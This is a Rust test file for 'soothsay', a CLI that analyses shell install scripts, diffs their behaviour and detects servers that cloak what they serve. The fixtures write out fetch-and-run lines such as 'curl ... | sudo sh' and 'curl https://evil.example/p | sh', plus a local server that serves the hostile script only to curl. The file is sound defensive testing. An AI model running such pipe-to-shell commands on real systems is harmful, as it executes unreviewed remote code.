use std::io::{BufRead, BufReader, Write};
use std::net::TcpListener;
use std::path::{Path, PathBuf};
use std::process::Command;

fn scratch(name: &str) -> PathBuf {
    let d = std::env::temp_dir().join(format!("soothsay-cli-{}-{name}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(&d).unwrap();
    d
}

fn soothsay(args: &[&str]) -> (i32, String, String) {
    let out = Command::new(env!("CARGO_BIN_EXE_soothsay"))
        .arg("--no-color")
        .args(args)
        .output()
        .unwrap();
    (
        out.status.code().unwrap_or(-1),
        String::from_utf8_lossy(&out.stdout).into_owned(),
        String::from_utf8_lossy(&out.stderr).into_owned(),
    )
}

fn write(dir: &Path, name: &str, body: &str) -> String {
    let p = dir.join(name);
    std::fs::write(&p, body).unwrap();
    p.to_string_lossy().into_owned()
}

#[test]
fn diff_shows_new_behaviour_and_exits_1() {
    let d = scratch("diff");
    let old = write(&d, "old.sh", "#!/bin/sh\nmkdir -p ~/.zap/bin\n");
    let new = write(
        &d,
        "new.sh",
        "#!/bin/sh\nmkdir -p ~/.zap/bin\necho 'export PATH=$HOME/.zap/bin:$PATH' >> ~/.zshrc\n",
    );
    let (code, out, _) = soothsay(&["--diff", &old, &new]);
    assert_eq!(code, 1, "{out}");
    assert!(out.contains("+ appends to ~/.zshrc"), "{out}");
    assert!(out.contains("Behaviour changed"), "{out}");
}

#[test]
fn diff_ignores_moved_lines() {
    let d = scratch("same");
    let old = write(
        &d,
        "old.sh",
        "#!/bin/sh\nmkdir -p ~/.zap\necho 'x' >> ~/.zshrc\n",
    );
    let new = write(
        &d,
        "new.sh",
        "#!/bin/sh\n# reformatted\n\necho 'x' >> ~/.zshrc\n\nmkdir -p ~/.zap\n",
    );
    let (code, out, _) = soothsay(&["--diff", &old, &new]);
    assert_eq!(code, 0, "{out}");
    assert!(out.contains("No behaviour change"), "{out}");
}

#[test]
fn diff_json_is_valid() {
    let d = scratch("json");
    let old = write(&d, "old.sh", "echo hi\n");
    let new = write(&d, "new.sh", "curl -fsSL https://x.dev/i.sh | sudo sh\n");
    let (code, out, _) = soothsay(&["--json", "--diff", &old, &new]);
    assert_eq!(code, 1);
    let v = soothsay::json::parse(&out).unwrap();
    assert_eq!(v.get("kind").and_then(|k| k.as_str()), Some("diff"));
    assert!(matches!(
        v.get("changed"),
        Some(soothsay::json::Value::Bool(true))
    ));
    let added = v.get("findings_added").unwrap();
    assert!(matches!(added, soothsay::json::Value::Arr(a) if !a.is_empty()));
}

#[test]
fn diff_needs_two_scripts() {
    let (code, _, err) = soothsay(&["--diff", "only-one.sh"]);
    assert_eq!(code, 2);
    assert!(err.contains("two scripts"), "{err}");
}

#[test]
fn unresolvable_url_is_a_clear_error() {
    let (code, _, err) = soothsay(&["https://soothsay-test.invalid/install.sh"]);
    assert_eq!(code, 2);
    assert!(err.contains("couldn't download"), "{err}");
    assert!(err.contains("soothsay-test.invalid"), "{err}");
}

#[test]
fn cloak_check_needs_a_url() {
    let d = scratch("cloak-file");
    let f = write(&d, "i.sh", "echo hi\n");
    let (code, _, err) = soothsay(&["--cloak-check", &f]);
    assert_eq!(code, 2);
    assert!(err.contains("needs a URL"), "{err}");
}

/// Serve `browser` to requests whose User-Agent looks like a browser and
/// `curl` to everything else, for `n` requests.
fn cloaking_server(browser: &'static str, curl: &'static str, n: usize) -> String {
    let l = TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = l.local_addr().unwrap();
    std::thread::spawn(move || {
        for stream in l.incoming().take(n) {
            let mut s = stream.unwrap();
            let mut ua = String::new();
            let mut r = BufReader::new(s.try_clone().unwrap());
            loop {
                let mut line = String::new();
                if r.read_line(&mut line).unwrap_or(0) == 0 || line == "\r\n" {
                    break;
                }
                if line.to_ascii_lowercase().starts_with("user-agent:") {
                    ua = line;
                }
            }
            let body = if ua.contains("Mozilla") {
                browser
            } else {
                curl
            };
            let _ = write!(
                s,
                "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                body.len()
            );
        }
    });
    format!("http://{addr}/install.sh")
}

#[test]
fn cloak_check_catches_a_server_that_lies_to_browsers() {
    let url = cloaking_server(
        "#!/bin/sh\nmkdir -p ~/.tool\n",
        "#!/bin/sh\nmkdir -p ~/.tool\ncurl -fsSL https://evil.example/p | sh\n",
        2,
    );
    let (code, out, err) = soothsay(&["--cloak-check", &url]);
    assert_eq!(code, 1, "{out}{err}");
    assert!(
        err.contains("different script to curl than to a browser"),
        "{err}"
    );
    assert!(out.contains("+ pipes https://evil.example/p"), "{out}");
}

#[test]
fn cloak_check_passes_an_honest_server() {
    let body = "#!/bin/sh\nmkdir -p ~/.tool\n";
    let url = cloaking_server(body, body, 2);
    let (code, out, err) = soothsay(&["--cloak-check", &url]);
    assert_eq!(code, 0, "{out}{err}");
    assert!(err.contains("cloak check passed"), "{err}");
    assert!(out.contains("soothsay"), "{out}");
}

#[test]
fn url_input_is_analyzed() {
    let body = "#!/bin/sh\necho 'export X=1' >> ~/.zshrc\n";
    let url = cloaking_server(body, body, 1);
    let (code, out, err) = soothsay(&[&url]);
    assert_eq!(code, 0, "{err}");
    assert!(out.contains("appends to ~/.zshrc"), "{out}");
    assert!(err.contains("plain HTTP"), "{err}");
}
